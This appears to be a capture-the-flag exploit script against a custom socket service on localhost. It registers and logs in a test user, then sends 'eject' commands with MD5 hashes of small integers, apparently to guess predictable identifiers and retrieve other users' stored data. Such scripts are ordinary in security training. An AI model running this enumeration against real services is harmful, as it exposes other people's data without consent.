import socket
import random
import hashlib

host = '127.0.0.1'
port = 2340

class CheckSock:
    def __init__(self, host, port, timeout = 5):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = host
        self.port = port
        self.socket.settimeout(timeout)
        
    def __enter__(self):
        self.s = self.socket.connect((self.host, self.port))
        self._recv()
        return self

    def __exit__(self, type, value, traceback):
        self.socket.close()

    def _send(self, message):
        self.socket.sendall((message + '\n').encode())
        
    def _recv(self):
        try:
            data =  self.socket.recv(1024)
        except:
            exit(1)
        try:    
            return data.decode().strip()
        except:
            return 'corrupted data'
    
    
    def register(self, username, password):
        self._send('1')  # Choose register
        self._recv()     # Username prompt
        self._send(username)
        self._recv()     # Password prompt
        self._send(password)
        return self._recv()
  
    def login(self, username, password):
        self._send('2')  # Choose login
        self._recv()     # Username prompt
        self._send(username)
        self._recv()     # Password prompt
        self._send(password)
        return self._recv()
    
    def eject(self, message):
        self._send(f'eject {message}')
        return self._recv()
    

def recv(s):
    return s.recv(1024).decode().strip()


test_username = f'exploiter_{random.randint(10000,1000000)}'
test_password = f'exploiter_pass'

with CheckSock(host, port) as s:
    reg_result = s.register(test_username, test_password)
if not reg_result.startswith("Registration successful!"):
    print("service has problems")
    exit(1)
with CheckSock(host, port) as s:
    login_result = s.login(test_username, test_password)
    if not login_result.startswith("Login successful!"):
        print("service has problems")
        exit(1)
    for i in range(1, 10):
        print(hashlib.md5(f'{i}'.encode("utf-8")).hexdigest())
        try:
            getall_result = s.eject(hashlib.md5(f'{i}'.encode("utf-8")).hexdigest())
        except:
            exit(0)
        print(getall_result)